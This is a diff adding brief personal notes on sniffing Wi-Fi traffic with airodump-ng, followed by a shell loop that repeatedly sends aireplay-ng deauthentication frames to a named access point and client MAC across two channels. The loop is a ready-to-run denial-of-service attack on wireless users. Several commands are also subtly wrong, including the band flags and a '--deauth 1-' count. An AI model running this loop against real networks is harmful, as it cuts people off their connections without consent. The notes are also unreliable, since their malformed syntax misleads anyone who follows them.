@@ -1,0 +1,29 @@
+PACKET SNIFFING
+       USING AIRODUMP-NG
+
+
+1) Part of the aircrack-ng suit
+2) Airodump-ng is a packet sniffer
+3)Used to capture all packets within range.
+4)Display detailed info about networks around us.
+5) Connected clients...etc
+
+
+use:
+airodump-ng (MonitorModeInterface).
+
+
+airodump-ng --band -a (MonitorModeInterface) = specifies 5Ghz networks.
+airodump-ng --band -abg (MonitorModeInterface) = Both 2.4 & 5Ghz networks.
+
+
+LOOP[ DEAUTHENTICATION:
+
+while true; do
+while> iwconfig wlan0 channel 44
+while> aireplay-ng --deauth 10 -a 34:5D:9E:DE:43:6D -c 0A:14:05:CF:87:23 wlan0
+while> sleep 1
+while> iwconfig wlan0 channel 11
+while> aireplay-ng --deauth 1- -a 34:5D:9E:DE:43:6D -c 0A:14:05:CF:87:23 wlan0
+while> sleep 1
+while> done
